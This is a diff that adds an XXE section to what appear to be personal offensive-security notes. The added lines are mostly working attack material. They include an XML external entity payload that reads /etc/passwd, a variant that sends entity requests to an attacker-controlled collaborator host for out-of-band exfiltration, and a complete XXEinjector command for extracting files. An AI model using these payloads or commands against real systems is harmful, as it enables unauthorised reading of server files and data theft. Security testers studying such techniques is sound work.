@@ -184,6 +184,7 @@ Js Analaysis
 	nuclei -t nuclei-templates/token-spray -var token=goanmginaonim
 	or can use file of tokens in token=token_file
 -----------------------------------------------------------------------------------------------------
+XXE
 to find xml can be found in contact_us page
   DOS ATTACK Via xml
   
@@ -208,7 +209,21 @@ to find xml can be found in contact_us page
 <message></message>
 </root>
 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    
+<stockCheck>
+<productId>
+&xxe;
+</productId><storeId>1</storeId></stockCheck>
 
+can put http://ip_of_the_server/directory and follow directories that appear in response 
+can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
+ [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
+  
+  XXEinjector	==> best injection xxe tool ==> https://github.com/hossamshady/XXEinjector
+ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter	==> xxe.req is file with request and delete the body xml and leave only 
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
 
 
 
